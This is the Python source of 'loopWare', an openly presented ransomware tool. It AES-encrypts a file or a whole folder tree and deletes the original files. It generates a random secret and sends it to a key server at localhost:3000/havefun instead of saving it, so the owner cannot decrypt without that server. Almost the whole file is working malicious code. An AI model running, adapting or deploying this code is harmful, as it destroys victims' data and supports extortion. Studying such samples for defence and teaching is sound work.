#!/usr/bin/env python

"""
Copyright (c) 2017 Lenin Alevski Huerta Arias.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the
rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
sell copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from __future__ import print_function

import re
import imp
import sys
import os
import glob
import urllib.request
import json
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from subprocess import Popen, PIPE
from time import strftime
from optparse import OptionParser
from lib.common import color
from lib.settings import BW
from lib.settings import ASK, PLUS, INFO, TEST, WARN, ERROR, DEBUG
from lib.logger import logger

NAME = "loopWare"
VERSION = "v0.0.1"
URL = "https://github.com/Alevsk/loopware"

# Maximum length of left option column in help listing
MAX_HELP_OPTION_LENGTH = 20

BANNER = """
( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)
( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)
( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)
( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)
( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)( ͡° ͜ʖ ͡°)"""

EXAMPLES = """
Examples:
python3 loopware.py -f secret.txt --encrypt
python3 loopware.py -f secret.txt -p key.secret --decrypt
python3 loopware.py -F my_secret_folder/ --encrypt --recursive
python3 loopware.py -F my_secret_folder/ -p key.secret --decrypt --recursive
python3 loopware.py --help
"""

SERVER = "http://localhost"
PORT = ":3000"
ENDPOINT = "/havefun"

def encrypt(key, fileName):

	if os.path.isfile(fileName):
		chunkSize = 64 * 1024
		outputFile = fileName + '.encrypted'
		fileSize = str(os.path.getsize(fileName)).zfill(16)
		IV = os.urandom(16)

		encryptor = AES.new(key, AES.MODE_CBC, IV)

		with open(fileName, 'rb') as inFile:
			with open(outputFile, 'wb') as outFile:
				outFile.write(fileSize.encode())
				outFile.write(IV)

				while True:
					chunk = inFile.read(chunkSize)

					if len(chunk) == 0:
						break
					elif len(chunk) % 16 != 0:
						chunk += b' ' * (16 - (len(chunk) % 16))

					outFile.write(encryptor.encrypt(chunk))

def decrypt(key, fileName):
	chunkSize = 64 * 1024
	outputFile = fileName.replace(".encrypted","")

	with open(fileName, 'rb') as inFile:
		fileSize = int(inFile.read(16))
		IV = inFile.read(16)

		decryptor = AES.new(key, AES.MODE_CBC, IV)

		with open(outputFile, 'wb') as outFile:
			while True:
				chunk = inFile.read(chunkSize)

				if len(chunk) == 0:
					break

				outFile.write(decryptor.decrypt(chunk))

			outFile.truncate(fileSize)

def generateKey():
	secret = bytearray(os.urandom(2048))
	# sFile = open('key.secret', 'wb')
	# sFile.write(secret)
	# sFile.close()
	request = urllib.request.Request(
		SERVER + PORT + ENDPOINT,
        secret
	)
	response = urllib.request.urlopen(request)
	jres = json.loads(response.read())
	print("Your private key uuid is: %s\n" % jres['uuid'])
	hasher = SHA256.new(secret)
	secret = None
	return hasher.digest()

def getKey(secret):
	with open(secret, 'rb') as sFile:
		hasher = SHA256.new(sFile.read())
		return hasher.digest()

def parse_args():
	"""
	Parses the command line arguments.
	"""
	# Override epilog formatting
	OptionParser.format_epilog = lambda self, formatter: self.epilog

	parser = OptionParser(usage="usage: %prog -f secret.txt | --file secret.txt | --folder allmysecrets", epilog=EXAMPLES)
	parser.add_option("-p", "--password", dest="password", help="set password file for AES decryption")
	parser.add_option("-f", "--file", dest="file", help="encrypt/decrypt this file")
	parser.add_option("-F", "--folder", dest="folder", help="encrypt/decrypt all files in this folder")
	parser.add_option("--encrypt", action="store_true", dest="encrypt", help="encrypt file(s)")
	parser.add_option("--decrypt", action="store_true", dest="decrypt", help="decrypt file(s)")
	parser.add_option("--recursive", action="store_true", dest="recursive", help="encrypt/decrypt files in folder recursively")

	parser.formatter.store_option_strings(parser)
	parser.formatter.store_option_strings = lambda _: None

	for option, value in parser.formatter.option_strings.items():
		value = re.sub(r"\A(-\w+) (\w+), (--[\w-]+=(\2))\Z", r"\g<1>/\g<3>",
					   value)
		value = value.replace(", ", '/')
		if len(value) > MAX_HELP_OPTION_LENGTH:
			value = ("%%.%ds.." % (MAX_HELP_OPTION_LENGTH -
								   parser.formatter.indent_increment)) % value
		parser.formatter.option_strings[option] = value

	args = parser.parse_args()[0]

	if not any((args.file, args.folder)):
		parser.error("Required argument is missing. Use '-h' for help.")

	if not any((args.encrypt, args.decrypt)):
		parser.error("Required argument is missing. Use '-h' for help.")

	if args.decrypt and not args.password:
		parser.error("Required password file is missing. Use '-h' for help.")

	return args

def main():
	"""
	Initializes and executes the program.
	"""

	print("%s\n\n%s %s (%s)\n" % (BANNER, NAME, VERSION, URL))

	args = parse_args()

	if args.file is not None and os.path.isfile(args.file):
		if args.encrypt:
			encrypt(generateKey(), args.file)
		else:
			if os.path.isfile(args.password):
				decrypt(getKey(args.password), args.file)

		print("%s %s" % (INFO, args.file))
		os.remove(args.file)

	elif args.folder is not None and os.path.isdir(args.folder):
		if args.encrypt:
			total = 0
			secret = generateKey()
			for filename in glob.iglob('%s/**' % (args.folder), recursive=args.recursive):
				if os.path.isfile(filename):
					print("%s %s" % (INFO, filename))
					encrypt(secret, filename)
					os.remove(filename)
					total += 1

			print("\n%s Files encrypted: %d" % (INFO, total))

		else:
			total = 0
			if os.path.isfile(args.password):
				secret = getKey(args.password)
				for filename in glob.iglob('%s/**/*.encrypted' % (args.folder), recursive=args.recursive):
					if os.path.isfile(filename):
						print("%s %s" % (INFO, filename))
						decrypt(secret, filename)
						os.remove(filename)
						total += 1

			print("\n%s Files decrypted: %d" % (INFO, total))
	else:
		print("%s Provided file/folder dont exists." % ERROR)

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("\n%s Ctrl-C pressed." % INFO)
